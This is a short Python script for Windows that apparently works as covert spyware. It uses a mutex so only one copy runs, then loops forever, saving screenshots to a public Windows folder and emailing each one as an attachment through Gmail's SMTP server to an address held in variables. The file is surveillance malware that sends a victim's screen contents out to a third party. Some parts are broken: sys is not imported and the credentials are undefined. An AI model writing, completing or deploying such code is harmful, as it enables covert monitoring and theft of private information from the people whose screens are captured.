from mss.windows import MSS as mss
from time import sleep
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32event, win32api, winerror

ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    sys.exit()


def shot():
	while True:
         sct = mss()
         for filename in sct.save(output='C:\\Users\\Public\\Libraries\\monitor-1.png'):
             sleep(15)
             msg = MIMEMultipart()
             msg['From'] = em
             passwd = pas
             msg['To'] = t
             attachment = open(filename, "rb")
             p = MIMEBase('application', 'octet-stream')
             p.set_payload((attachment).read())
             encoders.encode_base64(p)
             p.add_header('Content-Disposition', "attachment; filename= monitor-1.png")
             msg.attach(p)
             attachment.close()
             s = smtplib.SMTP('smtp.gmail.com', 587)
             s.starttls()
             s.login(msg['From'], passwd)
             text = msg.as_string()
             s.sendmail(msg['From'], msg['To'], text)
             s.close()
shot()
